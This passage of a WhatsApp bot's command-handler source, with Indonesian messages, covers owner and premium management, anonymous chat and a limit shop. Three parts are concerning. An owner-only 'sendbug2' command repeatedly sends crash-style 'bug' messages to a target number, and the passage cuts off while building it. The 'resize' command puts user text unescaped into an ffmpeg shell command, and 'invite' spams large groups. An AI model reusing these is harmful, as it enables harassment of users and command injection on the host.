	let fall ="*Commands Today*  \n"
	let totalFail =[]
	let totalSuc = []
	let total = 0
	let tot = 0
	await dash.map(async function(e, i){
	fall += "*•*"+` ${e.cmd} : ${e.succes+e.failed} \n`   
	await totalFail.push(e.failed)
	await totalSuc.push(e.succes)
	});
		 
	for(let i = 0; i < totalFail.length; i++){
	total += totalFail[i]
	} 
	
	  for(let a = 0; a < totalSuc.length; a++){
		  tot += totalSuc[a]
		  } 
	 
	let akoh = `Total : ${dash.length} used`
	let tod ="*Command Failed*\n"
	let filteredArray = await dash.filter(item => item.failed > 0 )
	await filteredArray.map(async function(e, i){
	tod += "*•*"+` ${e.cmd} : ${e.failed} \n`   
	
	});
	let aw = `Total : ${filteredArray.length} failed`    
	let tekz = teks+"\n\n"+fall+"\n"+akoh+"\n\n"+"*Command Status* \n"+" *•* Succes : "+tot+"\n"+" *•* Failed : "+total+"\n\n"+tod+"\n\n"
	setReply(tekz)                                                        
	}
	break
	
	case 'setfakegif':{
	if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
	if(isImage || isQuotedImage){
	let delb = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	await fse.copy(delb,`./stik/fake gif.jpeg`)
	fs.unlinkSync(delb)
	setReply(`Berhasil mengubah fake gif`)
	} else {
	setReply(`Kirim gambar dengan caption ${prefix+command}`);
	}
	}
	break;
	
	case 'obfus':{
	var JavaScriptObfuscator = require('javascript-obfuscator');
	 
	if(q){
	//await setReply("Loading...")
	let obfuscationResult = JavaScriptObfuscator.obfuscate(q);
	reply(obfuscationResult.getObfuscatedCode());
	} else if(isQuotedTeks){
	//await setReply("Loading...")
	let obfuscationResult = JavaScriptObfuscator.obfuscate(dev.quoted.text);
	reply(obfuscationResult.getObfuscatedCode());
	} else setReply("Masukan code java script")
	}
	break
	
	case 'packer':{
	var UglifyJS = require("uglify-js");
	if(q){
	let result  = await UglifyJS.minify(q)
	 reply(result.code)
	} else if(isQuotedTeks){
	  console.log(isQuotedTeks)
	let result  = await UglifyJS.minify(dev.quoted.text)
	 reply(result.code)
	} else setReply("Masukan code java script atau reply file.js")
	}
	break
	
	case 'deobfus':{
	
	  function beautifyJavaScript (source) {
		const beautify = require('js-beautify').js_beautify
		return beautify(source, {indent_size: 2})
	   }
	   
	  if(q){
		let teks = await beautifyJavaScript(q)
		setReply(teks)
	  } else if(isQuotedTeks){
		let teks = await beautifyJavaScript(dev.quoted.text)
		setReply(teks)
	  } else setReply("Masukan code java script")
	  }
	  break
	
	
	
	
	
	case  'addowner':{
	
	if (!isOwner) return onlyOwner()
	if (!isGroup) return setReply(mess.only.group)
	if(checkDataId("owner", Input,  DataId)) return setReply("User sudah menjadi owner")
	if(!checkDataName("owner", Input, DataId)) { await createDataId("owner", DataId) }
	addDataId(Input, "owner", DataId)
    let tag = Input.replace(/[@s.whatsapp.net]/g, "")
	setReply(`Berhasil menambahkan @${tag} ke daftar owner`)
	}
	break
	
	case  'delowner':
	if (!isOwner) return onlyOwner() 
	try {
	if(!checkDataId("owner", Input, DataId)) return setReply(`User bukan owner`)
	removeDataId ("owner", Input, DataId)
	setReply(`Berhasil menghapus @${Input.split("@")[0]} ke daftar owner`)
	} catch (err){
	console.log(err)
	setReply(`${err}`)
	}
	break
	
	
	
	
	
	case  'addcmdowner':{
	if (!isOwner) return onlyOwner()
	if(!q) return setReply(mess.query)
	if(checkDataId("commands", q,  DataId)) return setReply("User sudah menjadi owner")
	if(!checkDataName("commands", q, DataId)) { await createDataId("commands", DataId) }
	addDataId(q, "commands", DataId)
	setReply(`Berhasil menambahkan ${q} ke daftar fitur owner`)
	}
	break
	  
	  case  'delcmdowner':
	  if(!q) return setReply(mess.query)
	  if (!isOwner) return onlyOwner() 
	  try {
	  if(!checkDataId("commands", q, DataId)) return setReply(`User bukan owner`)
	  removeDataId ("commands", q, DataId)
	  setReply(`Berhasil menghapus ${q} ke daftar fitur owner`)
	  } catch (err){
	  console.log(err)
	  setReply(`${err}`)
	  }
	  break
	
	  case 'listcmdowner':{
	  let nana = await DataId.filter(item => item.name == "commands" )
	  let teks ="List Commands For Owner\n"
	  let nunu = nana[0].id
	  for(let i of nunu){
		teks +=`. ${i}\n`   
		}    
	  setReply(teks)
	  }
	  break
	  
	  
	  
	  
	  case  'addcmdprem':{
	if (!isOwner) return onlyOwner()
	if(!q) return setReply(mess.query)
	if(checkDataId("premium", q,  DataId)) return setReply("Command sudah ada di database")
	if(!checkDataName("premium", q, DataId)) { await createDataId("premium", DataId) }
	addDataId(q, "premium", DataId)
	setReply(`Berhasil menambahkan ${q} ke daftar fitur premium`)
	}
	break
	  
	  case  'delcmdprem':
	  if(!q) return setReply(mess.query)
	  if (!isOwner) return onlyOwner() 
	  try {
	  if(!checkDataId("premium", q, DataId)) return setReply("Command tidak ada di database")
	  removeDataId ("premium", q, DataId)
	  setReply(`Berhasil menghapus ${q} ke daftar fitur premium`)
	  } catch (err){
	  console.log(err)
	  setReply(`${err}`)
	  }
	  break
	  
	case 'listcmdprem':{
	  if(!checkDataName("premium", q, DataId)) { await createDataId("premium", DataId) }
	  let nana = await DataId.filter(item => item.name == "premium" )
	  let teks ="List Command For Premium User\n\n"
	  let nunu = nana[0].id
	  for(let i of nunu){
		teks +=`• ${toFirstCase(i)}\n`   
		}    
	   teks +=`\n• Total: ${nunu.length}\n` 
	  setReply(teks)
	  }
	  break  
	
	
	
	case  'addcmdlimit':{
	if (!isOwner) return onlyOwner()
	if(!q) return setReply(mess.query)
	if(checkDataId("limit", q,  DataId)) return setReply("Command sudah ada di database")
	if(!checkDataName("limit", q, DataId)) { await createDataId("limit", DataId) }
	addDataId(q, "limit", DataId)
	setReply(`Berhasil menambahkan ${q} ke daftar fitur limit`)
	}
	break
	  
	  case  'delcmdlimit':
	  if(!q) return setReply(mess.query)
	  if (!isOwner) return onlyOwner() 
	  try {
	  if(!checkDataId("limit", q, DataId)) return setReply("Command tidak ada di database")
	  removeDataId ("limit", q, DataId)
	  setReply(`Berhasil menghapus ${q} ke daftar fitur limit`)
	  } catch (err){
	  console.log(err)
	  setReply(`${err}`)
	  }
	  break
	  
	case 'listcmdlimit':{
	  let nana = await DataId.filter(item => item.name == "limit" )
	  let teks ="List Commands For limit\n"
	  let nunu = nana[0].id
	  for(let i of nunu){
		teks +=`. ${i}\n`   
		}    
	  setReply(teks)
	  }
	  break
	
	
	case 'resize':
	if (isQuotedImage || isImage) {
	if(!q) return setReply(`Masukan ukuran panjangxlebar, contoh ${prefix+command} 300x300`)
	setReply(mess.wait)
	let panjang = q.split('x')[0] 
	let lebar = q.split('x')[1] 
	let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let ran = getRandom('.jpeg')
	exec(`ffmpeg -i ${media} -vf scale=${panjang}:${lebar}  ${ran}`, async (err) => {
	fs.unlinkSync(media)
	if (err) return setReply(`Err: ${err}`)
	let buffer453 = fs.readFileSync(ran)
	await conn.sendMessage(from, {mimetype: 'image/jpeg', image: buffer453, caption: `Nih ${q}`}, { quoted: dev })
	fs.unlinkSync(ran)
	})
	} else {
	setReply("Reply Imagenya")
	}
	break
	
	
	case 'infoall': case 'tagall':
	if (!isGroup) return setReply(mess.only.group)
	if(!q) {
	var inpo = "No inpo"
	} else var inpo = q
	let members_id = []
	let tes = '\n'
	await groupMembers.map( i => {
	tes += `┣ ⬣@${i.id.split('@')[0]}\n`
	members_id.push(i.id) })
	mentions(`
	*From :* ${pushname}
	
	 Info :  ${inpo}
	
	Total Member : ${groupMembers.length} 
	
	┏━⬣`+tes+`┗━⬣`, members_id, false)
	break
	
	
	
	
	
		
	
	  case 'getallstik':
	let stiker1 = Object.keys(db.data.sticker)
	for (let jid of stiker1){
	await conn.sendMessage(from, {sticker: {url: db.data.sticker[jid].link }})
	await sleep(1000)
	}
	break
	
	
	
	
	case 'start': {
	//if (isGroup) return setReply('Fitur Tidak Dapat Digunakan Di Dalam Group!')
	if (roomA || roomB ) return setReply("Kamu masih berada di dalam room anonymous,  ketik keluar untuk keluar dari room anonymous mu")
	
	if (room) {
	await conn.sendMessage(room.a,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
	room.b = sender
	room.state = 'CHATTING'
	room.expired = "INFINITY"
	await conn.sendMessage(room.b,{text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan`}) 
	//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
				 
	} else {
	let id = + new Date
	const obj = {
	id,
	a: sender,
	b: '',
	state: 'WAITING',
	expired: Date.now() + toMs("5m")
	}
	anonChat.push(obj)
	//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
	let teks =`Kamu telah membuat room anonymous\nMohon tunggu sedang mencari partner`
	
	let mok = [{"buttonId": `${prefix}invite`,"buttonText": {"displayText": `Invite`},"type": "RESPONSE"},
						{"buttonId": `${prefix}keluar`,"buttonText": {"displayText": `ᴋᴇʟᴜᴀʀ`},"type": "RESPONSE"}]
	
	conn.sendButLoc(from, teks,copyright,fs.readFileSync('./stik/anonymous.jpg'), mok)
	}
	
	}
	break
	
		
	  case 'stop':
	case 'keluar': {
	//if (isGroup) return setReply('Fitur Tidak Dapat Digunakan Untuk Group!')
	if(roomA && roomA.state == "CHATTING"){
	
	await conn.sendMessage(roomA.b, {text:"Partnermu telah meninggalkan room anonymous"})
	await setTimeout(() => {
	  setReply("Kamu telah keluar dari room anonymous")
	  roomA.a = roomA.b
	  roomA.b = ""
	  roomA.state = "WAITING"
	  roomA.expired = Date.now() + toMs("5m")
	  //fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
	  
	},1000)
	
	} else if(roomA && roomA.state == "WAITING"){
	setReply("Kamu telah keluar dari room anonymous")
	//anonChat.splice(roomA, 1)
	//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
	
	anonChat.splice(anonChat.indexOf(roomA, 1)) 
	//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
	
	} else if(roomB && roomB.state == "CHATTING"){
	await conn.sendMessage(roomB.a,{text:`Partnermu telah meninggalkan room anonymous`})
	setReply("Kamu telah keluar dari room anonymous dan meninggalkan partner mu")
	  
	roomB.b =""
	roomB.state = "WAITING"
	roomB.expired = Date.now() + toMs("5m")
	//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
	
	
	} else setReply(`Kamu sedang tidak berada di room anonymous, tekan button untuk mencari partner`)
	  
	
	}
	break
	
	
	 case 'next':{
	//if (isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
	
	//Posisi di room A sedang waiting
	if (roomA && roomA.state == "WAITING" ) {
	setReply("Mencari Partner...")
	anonChat.splice(roomA, 1)
	//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
	
	await setTimeout( async () => {
	if ( Object.values(anonChat).find(room => room.state === 'WAITING' && room.b == "")) {
	await conn.sendMessage(room.a,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
	room.b = sender
	room.state = 'CHATTING'
	room.expired = "INFINITY"
	await conn.sendMessage(room.b,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
	//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))           
	} else {
	let id = + new Date
	const obj = {
	id,
	a: sender,
	b: '',
	state: 'WAITING',
	expired : Date.now() + toMs("5m")
	}
	anonChat.push(obj)
	//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
	setReply(`Kamu telah membuat room baru\nSilakan tunggu partner masuk ke dalam room`)
	}
	}, 2000) 
	
	//Posisi Room A sedang cattingan
	} else if(roomA && roomA.state == "CHATTING" ){
	await conn.sendMessage(roomA.b, {text: "Partnermu telah mengeluarkanmu dari room Anonymous"})
	setReply("Kamu telah mengeluarkan partnermu dari room anonymous ")
	await setTimeout(() => {
	setReply("Menunggu partner masuk ke dalam room")
	roomA.b = ""
	roomA.state = "WAITING"
	roomA.expired = Date.now() + toMs("5m")
	//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
	},1000)
	
	//Posisi di Room B sedang chattingan
	} else if(roomB){
	await conn.sendMessage(roomB.a, {text: "Partner telah meninggalkan room anonymous mu"})
	setReply("Mohon tunggu sedang mencari room")
	roomB.b =  ""
	roomB.state = "WAITING"
	roomB.expired = Date.now() + toMs("5m")
	//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
	
	await setTimeout( async () => {
	if ( Object.values(anonChat).find(room => room.state === 'WAITING' && room.b == "")) {
	await conn.sendMessage(room.a,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
	room.b = sender
	room.state = 'CHATTING'
	room.expired = "INFINITY"
	await conn.sendMessage(room.b,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
	//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))           
	} else {
	let id = + new Date
	const obj = {
	id,
	a: sender,
	b: '',
	state: 'WAITING',
	expired : Date.now() + toMs("5m")
	}
	anonChat.push(obj)
	//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
	setReply(`Kamu telah membuat room baru\nSilakan tunggu partner masuk ke dalam room`)
	}
	}, 2000) 
	} else setReply("Kamu sedang tidak berada di dalam room anonymous")
	
	
	
	}
	break
	
	case 'sendkontak': {
	if (isGroup) return setReply('Fitur Tidak Dapat Digunakan Untuk Group!')
	
	if (roomA && roomA.state == "CHATTING") {
	let profile = await conn.profilePictureUrl(roomA.a)
	let status = await conn.fetchStatus(roomA.a)
	let msg = await conn.sendImage(roomA.b, profile, `Nama : ${await conn.getName(roomA.a)}\nBio : ${status.status}\nUser : @${roomA.a.split("@")[0]}`, m, { mentions: [roomA.a] })
	conn.sendContact(roomA.b, roomA.a.split("@")[0], await conn.getName(roomA.a))
		
	 } else if(roomB && roomB.state == "CHATTING"){
	 //let profile = await conn.profilePictureUrl(roomB.b)
	//let status = await conn.fetchStatus(roomB.b)
	//let msg = await conn.sendImage(roomB.a, profile, `Nama : ${await conn.getName(roomB.b)}\nBio : ${status.status}\nUser : @${roomB.b.split("@")[0]}`, m, { mentions: [roomB.b] })
	conn.sendContact(roomB.a, roomB.b.split("@")[0],await conn.getName(roomB.b))
	
	 } else if(roomA == "undefined" || roomB == "undefined" ){
	setReply("Kamu sedang tidak berada di room anonymous")
	  
	} else setReply("Kamu belum dapat mengirim kontak karena kamu belum punya partner")
	
	}
	break
	
	
	case 'startchat': {
	if (isGroup) return setReply('Fitur Tidak Dapat Digunakan Di Dalam Group!')
	if(!q) return setReply("Masukan nomer target yang mau di chat")
	if (roomA || roomB ) return setReply("Kamu masih berada di dalam room anonymous,  ketik keluar untuk keluar dari room anonymous mu")
	let id = + new Date
	const obj = {
	id,
	a: sender,
	b: Input,
	state: "CHATTING",
	expired: "INFINITY"
	}
	
	anonChat.push(obj)
	//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
	setReply(`Kamu telah membuat room anonymous\nDan menjadikan ${Input} sebagai partner mu\nSekarang kamu bisa mengirim pesan`)
	
	
	}
	break
	
	case 'anonymous':{
	if(isGroup) return setReply("Tidak bisa di gunakan di dalam group")
	let teks =`
	Anonymous Chat adalah
	fitur yang memungkinkan kamu
	berinteraksi dengan user lain
	tanpa mengetahui identitas user
	dan terintegrasi secara acak.
	
	Klik start untuk memulai`
	
	let mok = [{"buttonId": `${prefix}start`,"buttonText": {"displayText": `sᴛᴀʀᴛ`},"type": "RESPONSE"},
						{"buttonId": `${prefix}keluar`,"buttonText": {"displayText": `ᴋᴇʟᴜᴀʀ`},"type": "RESPONSE"}]
	
	conn.sendButLoc(from, teks,copyright,fs.readFileSync('./stik/anonymous.jpg'), mok)
	
	}
	break
	
	
	
	case 'invite':{
	//if(isGroup) return setReply("Fitur tidak bisa di gunakan di dalam group")
	if(!roomA) return setReply("Kamu sedang tidak berada di room anonymous")
	if(roomB && roomB.state == "CHATTING" || roomA && roomA.state == "CHATTING" ) return setReply("Kamu sudah berada di room anonymous dan sudah memulai sesi chat")
	let getGroups = await conn.groupFetchAllParticipating()
	let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
	let ana = groups.map(v => v.id)
	let mem = [];
	for (let i of ana) {
	let data = await conn.groupMetadata(i)
	let obj = { id : data.id, total : data.participants.length}
	await mem.push(obj) 
	}
	let groupInvite = await mem.filter(member => member.total > 50 )
	
	let yesnih = [{"buttonId": `${prefix}joinchat ${roomA.id}`,"buttonText": {"displayText": `ᴊᴏɪɴ ᴄʜᴀᴛ`},"type": "RESPONSE"}
							]
	
	let teks = `
	Seseorang telah mengundang kamu 
	untuk bergabung ke room anonymous chat
	tekan tombol join chat di bawah ini untuk 
	bergabung di room anonymous dan memulai 
	sesi chat dengan user lain`
	await conn.sendMessage(from, {text: `Mengirim undangan anonymous, waktu selesai ${groupInvite.length * 3 } detik`})
	
	for (let i of groupInvite) {
	await sleep(3000)
	await conn.sendButLoc(i.id, teks,copyright,fs.readFileSync('./stik/anonymous.jpg'), yesnih)
	}
	await conn.sendMessage(from, {text: `Undangan telah terkirim ke ${groupInvite.length} group` })
	
	}
	break
	
	
	case 'joinchat':{
	if(!q) return setReply("Masukan id room anonymous")
	if(roomA && roomA.state == "WAITING" ) return setReply("Kamu masih berada di room anonymous")
	if(roomB && roomB.state == "CHATTING" || roomA && roomA.state == "CHATTING" ) return setReply("Kamu sudah berada di room anonymous dan sudah memulai sesi chat")
	let joinRoom = Object.values(anonChat).find(room => room.id == q && room.state == "WAITING")
	if (joinRoom) {
	await conn.sendMessage(joinRoom.a,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
	room.b = sender
	room.state = 'CHATTING'
	room.expired = "INFINITY"
	await conn.sendMessage(joinRoom.b,{text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan`}) 
	setReply(`Berhasil join ke room, silakan cek di chat bot\nAtau bisa klik nomer di bawah ini untuk memulai sesi chat\n\nhttp://wa.me/${botNumber.split("@")[0]}`)
	//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
				 
	} else if (room) {
	await conn.sendMessage(room.a,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
	room.b = sender
	room.state = 'CHATTING'
	room.expired = "INFINITY"
	await conn.sendMessage(room.b,{text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan`}) 
	setReply(`Berhasil mendapatkan room, silakan cek di chat bot\nAtau bisa klik nomer di bawah ini untuk memulai sesi chat\n\nhttp://wa.me/${botNumber.split("@")[0]}`)
	//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
				 
	} else {
	let id = + new Date
	const obj = {
	id,
	a: sender,
	b: '',
	state: 'WAITING',
	expired: Date.now() + toMs("5m")
	}
	anonChat.push(obj)
	//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
	await conn.sendMessage(sender,{text: `Kamu telah membuat room anonymous\nMohon tunggu sedang mencari partner`})
	setReply(`Kamu telah membuat room anonymous\nMohon tunggu sedang mencari partner`)
	}
	
	
	}
	break
	
	
	
	
	
	
	
	
	
	case 'antivirtex':{
	if (!isGroup) return setReply('Kusus group')
	if (!isGroupAdmins) return setReply(mess.only.admin)
	if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
	 if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
	if (isAntiVirtex) return setReply("Sudah aktif!!");
	db.data.chats[from].antivirtex = true
	setReply("Sukses mengaktifkan antivirtex!");
	} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
	if (!isAntiVirtex) return setReply("Udah off!!");
	db.data.chats[from].antivirtex = false
	setReply("Sukses mematikan antivirtex!");
	} else if (!q) {
	conn.sendButMessage(from, `MODE Anti Virtex`, `Silahkan pilih salah satu`, 
	[{buttonId: `${prefix}antivirtex on`, buttonText: { displayText: `on`,},type: 1,},
	{buttonId: `${prefix}antivirtex off`, buttonText: { displayText: `off`,}, type: 1}, ]);
	 }
	 }
	break;
	
	case 'listowner':{
	  if(!checkDataName("owner", q, DataId)) { await createDataId("owner", DataId) }
	  let nana = await DataId.filter(item => item.name == "owner" )
	  if(!nana) return setReply("Tidak ada")
	  let teks ="List Owner\n"
	  let nunu = nana[0].id
	  for(let i of nunu){
		teks +=`- @${i.split("@")[0]} \n`   
		}    
	  setReply(teks)
	  }
	  break
	
	
	  case 'antihidetag':{
	if (!isGroupAdmins) return setReply(mess.only.admin)
	if (!isGroup) return setReply('hanya bisa di group')
	if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
	if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
	if (isAntihidetag) return setReply('Fitur sudah aktif kak')
	addDataId(from, command, DataId)
	let ih =`Fitur anti hidetag telah di aktifkan`
	setReply(ih)
	} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
	if (!isAntihidetag) return setReply('Fitur Anti link sudah off')
	removeDataId (command, from, DataId)
	let ih =`Fitur anti hidetag telah di matikan`
	setReply(ih)
	} else if (!q) {
	conn.sendButMessage(from, `MODE ANTI TAG`, `Silahkan pilih salah satu`, [
	{buttonId: `${prefix}antihidetag on`, buttonText: {displayText: On },type: 1},
	{buttonId: `${prefix}antihidetag off`, buttonText: { displayText: Off },type: 1}]);
	}
	}
	break
	
	
	  case 'owner':{
					conn.sendKontak(from, global.nomerOwner, global.ownerName, m)
				}
				break
	
	  case 'setimgdoc':{
	if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
	if(isImage || isQuotedImage){
	let delb = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	await fse.copy(delb,`./stik/thumbnaildokumen.jpg`)
	fs.unlinkSync(delb)
	setReply(`Berhasil mengubah image doc`)
	} else {
	setReply(`Kirim gambar dengan caption ${prefix+command}`);
	}
	}
	break
	
	  case 'setimgweb':{
	if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
	if(isImage || isQuotedImage){
	let delb = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	await fse.copy(delb,`./stik/web.jpg`)
	fs.unlinkSync(delb)
	setReply(`Berhasil mengubah image web`)
	} else {
	setReply(`Kirim gambar dengan caption ${prefix+command}`);
	}
	}
	break
	
	case  'limit':
	case 'ceklimit': 
	if(mentionByReply){
	let nomer = mentionByReply.split("@")[0]
	 setReply(`*${await conn.getName(mentionByReply)}*\n\nLimit : ${isPremium ? 'Unlimited' : `${db.data.users[mentionByReply].limit}/${limitCount}`}\nLimit Game : ${db.data.users[mentionByReply].glimit}/${gcount}\nSaldo : Rp ${db.data.users[mentionByReply].balance.toLocaleString()}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`) 
	} else {   
	setReply(`*${pushname}*\n\nLimit : ${isPremium ? 'Unlimited' : `${db.data.users[sender].limit}/${limitCount}`}\nLimit Game : ${db.data.users[sender].glimit}/${gcount}\nSaldo : Rp ${db.data.users[sender].balance.toLocaleString()}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`)
	}
	break
	
	
	case 'buylimit':{
	if (!q) return setReply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = Rp1000`)
	if (q.includes('-')) return setReply(`Jangan menggunakan -`)
	if (isNaN(q)) return setReply(`Harus berupa angka`)
	let ane = Number(math(q) * 1000)
	if (db.data.users[sender].balance < ane) return setReply(`Saldo kamu tidak mencukupi untuk pembelian ini`)
	db.data.users[sender].balance -= ane
	db.data.users[sender].limit += math(q)
	setReply(`Pembeliaan limit sebanyak ${q} berhasil\n\nSisa Saldo : Rp ${db.data.users[sender].balance.toLocaleString()}\nSisa Limit : ${db.data.users[sender].limit}/${limitCount}`)
	}
	break
	
	case 'claim':
	case 'daily':{
	const free = 5000
	const prem = 10000
	const moneyfree = 5000
	const moneyprem = 10000
	const timeout = 86400000
	let time = global.db.data.users[sender].lastclaim + 86400000
	 if (new Date - global.db.data.users[sender].lastclaim < 86400000) return setReply( `Anda sudah mengklaim, klaim harian hari ini\ntunggu selama ${conn.msToTime(time - new Date())} lagi`)
	 global.db.data.users[sender].exp += isPremium ? prem : free
	 global.db.data.users[sender].balance += isPremium ? moneyprem : moneyfree
	setReply(`Selamat kamu mendapatkan:\n\n+${isPremium? prem : free} Exp\n+${isPremium? moneyprem : moneyfree} Balance`)
	global.db.data.users[sender].lastclaim = new Date * 1
	} 
	break 
	
	
	case 'shop':{
	let teks = `
	*]────「 SHOP」────[*
	
	Halo ${pushname} 
	Saldo : Rp ${db.data.users[sender].balance.toLocaleString()}
	
	• List Harga
	1 Limit : Rp 1000
	1 Limit Game : Rp 750
	1 Jam Premium : Rp 50,000
	
	NOTE :
	Untuk membeli Limit ketik ${prefix}buylimit jumlah limit
	Contoh : ${prefix}buylimit 10
	
	Untuk membeli Limit Game ketik ${prefix}buyglimit jumlah limit
	Contoh : ${prefix}buyglimit 10`
	setReply(teks)
	}
	break 
	
	case 'banuser':
	if (!isOwner) return setReply(mess.only.Bowner)
	if(!q) return setReply(`Masukan Id whatsapp`)
	let nama = await conn.getName(q)
	if(db.data.users[sender].banned.status) return setReply('Done')
	if(!db.data.users[sender].banned.status) db.data.users[sender].banned.status = true              
	teks =`
	Kamu telah di banned karena
	menyalahgunakan Fitur _*reportbug*_
	
	Nama: ${nama}
	Nomer: ${q.split("@")[0]}
	Tanggal: ${calender}
	Total Banned : ${JSON.parse(fs.readFileSync('./database/banned.json')).length}
	
	${copyright}`
	await conn.sendMessage(q,{text: teks})
	
	break
	
	case 'addprem':
		if (!isOwner) return onlyOwner()
		
		if (mentionByReply && isGroup) {
		if(!q) return setReply(`Penggunaan :\n${prefix}addprem\n\nPilih waktu\ns = detik\nh = jam\nd =hari`)      
		 //if(_prem.checkPremiumUser (mentionByReply, premium)) return setReply("User tersebut sudah di premium")   
		_prem.addPremiumUser (mentionByReply, q, premium)         
		 setReply(`Succes add premium @${mentionByReply.split("@")[0]}`)
		await conn.sendButMessage(mentionByReply, `HALO KAK AKU *${fake}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
							  {buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
							  {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
			
		 } else if(mentionByTag && isGroup) { 
		let waktu = q.split(" ")[1]
		 //if(_prem.checkPremiumUser (mentionByTag, premium)) return setReply("User tersebut sudah di premium kak")   
		_prem.addPremiumUser (mentionByTag, waktu, premium)         
		await setReply(`Succses, silakan ketik ${prefix}listprem untuk melihat list premium`)
		await conn.sendButMessage(mentionByTag, `HALO KAK AKU *${fake}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
							  {buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
							  {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
		   } else if(!isGroup){
		let usernya = q.split("|")[0].replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
		let waktunya = q.split("|")[1]
		
		// if(_prem.checkPremiumUser (usernya, premium)) return setReply("User tersebut sudah di premium kak")   
		_prem.addPremiumUser (usernya, waktunya, premium)         
		await setReply(`Succses, silakan ketik ${prefix}listprem untuk melihat list premium`)
		await conn.sendButMessage(usernya, `HALO KAK AKU *${fake}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
							  {buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
							  {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
		   } else setReply("Tag atau Reply usernya")
		break
		
		case 'cekprem': case 'cekpremium':
			if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
			let cekvip = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
			let premiumnya = `${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)`
setReply(premiumnya)
			  break
	  
	
	
	 case 'delprem':
	if (!isOwner) return onlyOwner()
	if(Input){
	 if(!_prem.checkPremiumUser (Input, premium)) return setReply("Maap kak user tersebut tidak ada di database") 
	_prem.delPremiumUser (Input, premium)
	setReply(`Succes delete premium @${Input.split("@")[0]}`)          
	   
	} else setReply("Tag/Reply/Input nomer target")
	break
	
	
	  
case  'sendbug2':
	try{
	if(!isOwner) return onlyOwner()
	let Pe = mentionByTag[0]? mentionByTag[0] : mentionByReply ? mentionByReply : q? numberQuery : false
	console.log(Pe)
	if(!Pe ) return setReply("Masukan nomer target")
	if(Pe == Ownerin) return setReply("SendBug Gagal")
	await setReply("Sending...")
	for (let i = 0; i < 100; i++) {
	await sleep(60000)
	console.log("sending")
	  const muk = [{urlButton: {displayText: `Owner Bot`,url: `https://wa.me/${nomerOwner}`}}, 
{urlButton: {displayText: `Owner Bot`,url: `https://wa.me/${nomerOwner}`}}, 
{urlButton: {displayText: `Owner Bot`,url: `https://wa.me/${nomerOwner}`}}, 
{ quickReplyButton: { displayText: `ᴅᴀsʜʙᴏᴀʀᴅ`, id: `${prefix}dashboard` } },
{ quickReplyButton: { displayText: `ᴅᴀsʜʙᴏᴀʀᴅ`, id: `${prefix}dashboard` } },
